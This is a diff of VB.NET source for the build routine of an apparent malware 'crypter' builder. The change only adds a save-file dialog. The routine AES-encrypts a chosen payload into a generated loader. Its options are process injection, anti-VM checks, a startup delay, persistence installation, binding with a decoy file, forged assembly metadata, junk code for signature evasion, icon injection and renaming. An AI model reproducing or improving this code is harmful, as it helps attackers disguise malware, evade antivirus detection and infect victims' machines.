@@ -285,121 +285,127 @@ Public Class Form2
 #Region "Build"
     Private Sub btnBuild_Click(sender As Object, e As EventArgs) Handles btnBuild.Click
         Try
-            If txtLog.InvokeRequired Then : txtLog.Invoke(Sub() txtLog.ResetText()) : Else : txtLog.ResetText() : End If
-            Dim Loader As String = My.Resources.Loader
-            txtLog.Text = txtLog.Text.Insert(0, "Creating Encryption Key..." + vbNewLine)
-            Dim AESkey As String = Randomi(8)
-            Loader = Replace(Loader, "#KEY", AESkey)
+            Dim o As New SaveFileDialog
+            o.Filter = "Executable |*.exe"
+            If o.ShowDialog = DialogResult.OK Then
 
-            'Install
-            If chkInstall.Checked Then
-                txtLog.Text.Insert(0, "Install..." + vbNewLine)
-                Loader = Replace(Loader, "'@INS", Nothing)
-                Loader = Replace(Loader, "#PATH", txtExeFolder.Text)
-                Loader = Replace(Loader, "#EXE", "\" + txtExeName.Text)
-            End If
+                If txtLog.InvokeRequired Then : txtLog.Invoke(Sub() txtLog.ResetText()) : Else : txtLog.ResetText() : End If
+                Dim Loader As String = My.Resources.Loader
+                txtLog.Text = txtLog.Text.Insert(0, "Creating Encryption Key..." + vbNewLine)
+                Dim AESkey As String = Randomi(8)
+                Loader = Replace(Loader, "#KEY", AESkey)
 
-            'Injection
-            Dim inject As String = ""
-            txtLog.Text = txtLog.Text.Insert(0, "Injecting..." + vbNewLine)
-            If txtInjection.Text = "Itself" Then
-                inject = "Application.ExecutablePath"
-            Else
-                inject = Chr(34) + Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory() + txtInjection.Text + ".exe" + Chr(34)
-            End If
-            Loader = Replace(Loader, "#INJECT", inject)
-
-            'Delay
-            If chkDelay.Checked Then
-                txtLog.Text = txtLog.Text.Insert(0, "Adding Delay..." + vbNewLine)
-                Loader = Replace(Loader, "'@DELAY", Nothing)
-                Loader = Replace(Loader, "#DELAY", txtDelay.Text)
-            End If
-
-            'Anti Vm
-            If chkAntiVM.Checked Then
-                txtLog.Text = txtLog.Text.Insert(0, "Activate Anti VM..." + vbNewLine)
-                Loader = Replace(Loader, "'@VM", Nothing)
-            End If
-
-            'Assembly
-            If chkAssembly.Checked Then
-                txtLog.Text = txtLog.Text.Insert(0, "Writing Assembly..." + vbNewLine)
-                Loader = Replace(Loader, "'%ASSEMBLY%", Nothing)
-                Loader = Replace(Loader, "%Title%", txtAssemblyTitle.Text)
-                Loader = Replace(Loader, "%Description%", txtAssemblyDescription.Text)
-                Loader = Replace(Loader, "%Company%", txtAssemblyCompany.Text)
-                Loader = Replace(Loader, "%Product%", txtAssemblyProduct.Text)
-                Loader = Replace(Loader, "%Copyright%", txtAssemblyCopyright.Text)
-                Loader = Replace(Loader, "%Trademark%", txtAssemblyTrademark.Text)
-                Loader = Replace(Loader, "%v1%", txtAssemblyv1.Text)
-                Loader = Replace(Loader, "%v2%", txtAssemblyv2.Text)
-                Loader = Replace(Loader, "%v3%", txtAssemblyv3.Text)
-                Loader = Replace(Loader, "%v4%", txtAssemblyv4.Text)
-                Loader = Replace(Loader, "%Guid%", Guid.NewGuid.ToString)
-            End If
-
-            'Junke methods
-            Loader = Replace(Loader, "%JUNK1%", GenerateJunk(RandomNumber(1, 2)))
-            Loader = Replace(Loader, "%JUNK2%", GenerateJunk(RandomNumber(1, 2)))
-
-            'Junk Class
-            Loader = Replace(Loader, "%JUNK3%", GenerateJunkClass(RandomNumber(1, 2)))
-            Loader = Replace(Loader, "%JUNK4%", GenerateJunkClass(RandomNumber(1, 2)))
-
-            'Creating files
-            txtLog.Text = txtLog.Text.Insert(0, "Creating DLLs" + vbNewLine)
-            Dim ResName As String = Randomi(rand.Next(4, 10))
-            Dim ResPayload As String = Randomi(rand.Next(4, 10))
-            Dim ResINS As String = Randomi(rand.Next(4, 10))
-            Dim ResVM As String = Randomi(rand.Next(4, 10))
-            Dim ResPE As String = Randomi(rand.Next(4, 10))
-            Dim ResBIND As String = Randomi(rand.Next(4, 10))
-
-            Loader = Replace(Loader, "#PEdll", ResPE)
-            Loader = Replace(Loader, "#PAYLOAD", ResPayload)
-            Loader = Replace(Loader, "#VMdll", ResVM)
-            Loader = Replace(Loader, "#INSdll", ResINS)
-            Loader = Replace(Loader, "#ResName", ResName)
-
-            Using R As New Resources.ResourceWriter(IO.Path.GetTempPath & "\" + ResName + ".Resources")
-                R.AddResource(ResPayload, AESEncrypt((IO.File.ReadAllBytes(Form1.txtPayload.Text)), AESkey))
-                R.AddResource(ResPE, AESEncrypt((My.Resources.PE), AESkey))
-
-                If chkAntiVM.Checked = True Then
-                    R.AddResource(ResVM, AESEncrypt((My.Resources.VM), AESkey))
-                End If
-
+                'Install
                 If chkInstall.Checked Then
-                    R.AddResource(ResINS, AESEncrypt((My.Resources.INS), AESkey))
+                    txtLog.Text.Insert(0, "Install..." + vbNewLine)
+                    Loader = Replace(Loader, "'@INS", Nothing)
+                    Loader = Replace(Loader, "#PATH", txtExeFolder.Text)
+                    Loader = Replace(Loader, "#EXE", "\" + txtExeName.Text)
                 End If
 
-                If txtBind.Text <> "" Then
-                    R.AddResource(ResBIND, AESEncrypt((IO.File.ReadAllBytes(txtBind.Text)), AESkey))
-                    Loader = Replace(Loader, "'@BIND", Nothing)
-                    Loader = Replace(Loader, "#BINDdll", ResBIND)
-                    If chkBindOnce.Checked Then
-                        Loader = Replace(Loader, "'@ONCE", Nothing)
-                        Loader = Replace(Loader, "#ONCE", Randomi(rand.Next(4, 10)))
+                'Injection
+                Dim inject As String = ""
+                txtLog.Text = txtLog.Text.Insert(0, "Injecting..." + vbNewLine)
+                If txtInjection.Text = "Itself" Then
+                    inject = "Application.ExecutablePath"
+                Else
+                    inject = Chr(34) + Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory() + txtInjection.Text + ".exe" + Chr(34)
+                End If
+                Loader = Replace(Loader, "#INJECT", inject)
+
+                'Delay
+                If chkDelay.Checked Then
+                    txtLog.Text = txtLog.Text.Insert(0, "Adding Delay..." + vbNewLine)
+                    Loader = Replace(Loader, "'@DELAY", Nothing)
+                    Loader = Replace(Loader, "#DELAY", txtDelay.Text)
+                End If
+
+                'Anti Vm
+                If chkAntiVM.Checked Then
+                    txtLog.Text = txtLog.Text.Insert(0, "Activate Anti VM..." + vbNewLine)
+                    Loader = Replace(Loader, "'@VM", Nothing)
+                End If
+
+                'Assembly
+                If chkAssembly.Checked Then
+                    txtLog.Text = txtLog.Text.Insert(0, "Writing Assembly..." + vbNewLine)
+                    Loader = Replace(Loader, "'%ASSEMBLY%", Nothing)
+                    Loader = Replace(Loader, "%Title%", txtAssemblyTitle.Text)
+                    Loader = Replace(Loader, "%Description%", txtAssemblyDescription.Text)
+                    Loader = Replace(Loader, "%Company%", txtAssemblyCompany.Text)
+                    Loader = Replace(Loader, "%Product%", txtAssemblyProduct.Text)
+                    Loader = Replace(Loader, "%Copyright%", txtAssemblyCopyright.Text)
+                    Loader = Replace(Loader, "%Trademark%", txtAssemblyTrademark.Text)
+                    Loader = Replace(Loader, "%v1%", txtAssemblyv1.Text)
+                    Loader = Replace(Loader, "%v2%", txtAssemblyv2.Text)
+                    Loader = Replace(Loader, "%v3%", txtAssemblyv3.Text)
+                    Loader = Replace(Loader, "%v4%", txtAssemblyv4.Text)
+                    Loader = Replace(Loader, "%Guid%", Guid.NewGuid.ToString)
+                End If
+
+                'Junke methods
+                Loader = Replace(Loader, "%JUNK1%", GenerateJunk(RandomNumber(1, 2)))
+                Loader = Replace(Loader, "%JUNK2%", GenerateJunk(RandomNumber(1, 2)))
+
+                'Junk Class
+                Loader = Replace(Loader, "%JUNK3%", GenerateJunkClass(RandomNumber(1, 2)))
+                Loader = Replace(Loader, "%JUNK4%", GenerateJunkClass(RandomNumber(1, 2)))
+
+                'Creating files
+                txtLog.Text = txtLog.Text.Insert(0, "Creating DLLs" + vbNewLine)
+                Dim ResName As String = Randomi(rand.Next(4, 10))
+                Dim ResPayload As String = Randomi(rand.Next(4, 10))
+                Dim ResINS As String = Randomi(rand.Next(4, 10))
+                Dim ResVM As String = Randomi(rand.Next(4, 10))
+                Dim ResPE As String = Randomi(rand.Next(4, 10))
+                Dim ResBIND As String = Randomi(rand.Next(4, 10))
+
+                Loader = Replace(Loader, "#PEdll", ResPE)
+                Loader = Replace(Loader, "#PAYLOAD", ResPayload)
+                Loader = Replace(Loader, "#VMdll", ResVM)
+                Loader = Replace(Loader, "#INSdll", ResINS)
+                Loader = Replace(Loader, "#ResName", ResName)
+
+                Using R As New Resources.ResourceWriter(IO.Path.GetTempPath & "\" + ResName + ".Resources")
+                    R.AddResource(ResPayload, AESEncrypt((IO.File.ReadAllBytes(Form1.txtPayload.Text)), AESkey))
+                    R.AddResource(ResPE, AESEncrypt((My.Resources.PE), AESkey))
+
+                    If chkAntiVM.Checked = True Then
+                        R.AddResource(ResVM, AESEncrypt((My.Resources.VM), AESkey))
                     End If
+
+                    If chkInstall.Checked Then
+                        R.AddResource(ResINS, AESEncrypt((My.Resources.INS), AESkey))
+                    End If
+
+                    If txtBind.Text <> "" Then
+                        R.AddResource(ResBIND, AESEncrypt((IO.File.ReadAllBytes(txtBind.Text)), AESkey))
+                        Loader = Replace(Loader, "'@BIND", Nothing)
+                        Loader = Replace(Loader, "#BINDdll", ResBIND)
+                        If chkBindOnce.Checked Then
+                            Loader = Replace(Loader, "'@ONCE", Nothing)
+                            Loader = Replace(Loader, "#ONCE", Randomi(rand.Next(4, 10)))
+                        End If
+                    End If
+
+                    R.Generate()
+                End Using
+
+
+
+                If Compile(ResName, o.FileName, Loader) Then
+
+                    'Icon
+                    If chkIcon.Checked Then
+                        IconInjector.InjectIcon(o.FileName, picIcon.ImageLocation)
+                    End If
+
+                    'Renamer
+                    Renamer.Mono(o.FileName)
+                    txtLog.Text = txtLog.Text.Insert(0, "Done!!" + vbNewLine)
                 End If
-
-                R.Generate()
-            End Using
-
-
-
-            If Compile(ResName, "Crypted", Loader) Then
-
-                'Icon
-                If chkIcon.Checked Then
-                    IconInjector.InjectIcon("Crypted.exe", picIcon.ImageLocation)
-                End If
-
-                'Renamer
-                Renamer.Mono("Crypted.exe")
-                txtLog.Text = txtLog.Text.Insert(0, "Done!!" + vbNewLine)
             End If
+
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Exclamation)
         End Try
